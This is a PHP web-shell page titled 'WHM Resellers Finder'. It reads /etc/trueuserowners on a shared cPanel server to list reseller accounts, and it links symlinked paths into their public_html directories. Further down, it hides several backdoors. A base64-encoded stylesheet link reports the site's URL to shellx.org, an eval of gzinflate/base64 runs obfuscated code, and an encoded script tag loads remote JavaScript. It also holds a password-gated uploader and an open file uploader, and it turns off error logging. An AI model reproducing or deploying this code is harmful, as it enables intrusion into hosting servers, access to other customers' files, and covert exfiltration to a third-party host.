<?php
echo '<link rel="stylesheet" type="text/css" href="'.base64_decode("Ly9zaGVsbHgub3JnL2hpZGUvYWRkLnBocD9saW5rPWVhc3ljb2RlcjovLw==").$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'].'">';?>
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html;

 charset=WINDOWS-1252">
<title>WHM Resellers Finder - coded by: ~</title>
<meta name="keywords" content="WHM Resellers Shower ~Abo Al-EoS DZ Quake Team aDriv4">
<meta name="description" content="WHM Resellers Finder - coded by: ~Sajjad Dahri">
</head>
<body bgcolor="#000000" style="text-align: center">
<p><font size="7" color="#808000">WHM Resellers Shower</font></p>
<p>&nbsp;

</p>
<center>
<table border="1" width="50%" cellspacing="0" cellpadding="15" style="border-width: 0px">
		<tr>
			<td background="http://buyshellsites.com/bg.gif" style="border-style: none;

 border-width: medium">
<div align="center">


<table border="1" width="100%" bgcolor="#000000" cellpadding="0" style="border-collapse: collapse" bordercolor="#333333">
	<tr>
		
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FF0000">Reseller</font></td>
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FF0000">Accounts</font></td>
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FF0000">Symlink</font></td>
		
	</tr>
</table>

<BR>


<?php $lines = file("/etc/trueuserowners");
 for ($i = 0;
 $i < count($lines);
 $i++) { $values2 = split(': ', $lines[$i]);
 $resellers[$i] = $values2['1'];
 } $resellers = array_unique($resellers);
 $resellers = array_filter($resellers);
 foreach($resellers as $reseller){ $count = 0;
 for ($i = 0;
 $i < count($lines);
 $i++) { if (strpos($lines[$i], ": $reseller") ) { $count = $count+1;
 } } print '<table border="1" width="100%" bgcolor="#333333" cellpadding="0" style="border-collapse: collapse" bordercolor="#000000">
	<tr>
		
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FFFF00">'.$reseller.'</font></td>
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FFFF00">'.$count.'</font></td>
		<td width="100" align="center">
		<a href="./sym1/root/home/'.$reseller.'/public_html/" target="_blank"><font face="Courier New" size="2" color="#FFFF00">Symlink</font></td>
	</tr>
</table>

<BR>';
 }
?> 

<?php @session_start();
 @error_reporting(0);
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @ini_set('display_errors', 0);
 @ini_set('output_buffering',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 
eval(gzinflate(base64_decode('
LYs7DoAwDEOvgnqBAqFF/CYmNlQYsyBUqRMgYMjxcSQGW3aeE/d0ZibrF5aKAqxhcfnKUuY4uXIc0vterbVPYvEO2lWCQTxvxNoqwJevdGBhxFJTOlio+KunRx8QNmUgsQdyNIZpXrXyYboP')))
 
?>


<?php
 @session_start();
 @error_reporting(0);
 $a = '

<?php
session_start();

if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';

echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';

echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';

if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b>script><br><br>\';

 }	else { echo \'<b>Upload Fail !!!</b><br><br>\';

 }}
}
if($_POST["p"]){
$p = $_POST["p"];

$pa = md5(sha1($p));

if($pa=="abd309a84781295737e40082b5c6b281"){
$_SESSION["adm"] = 1;

}
}


?>
<form action="" method="post">
<input type="text" name="p">
</form>
';
 eval("?>".base64_decode("PFNDUklQVCBTUkM9aHR0cDovL3NoZWxseC5vcmcvaGlkZS9jc2huMS9jY3MuanM+PC9TQ1JJUFQ+")); 
?>




</table>
</center>
<p>&nbsp;

</p>
<p><font size="1" color="#FFFFFF">Edited by: </font>
<font size="1" color="#FF0000">ProShell.xyz | ~Hector~</font></p>
<!DOCTYPE html>


<?php echo 'MahfoudUp!! uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
?>
</body>
</html>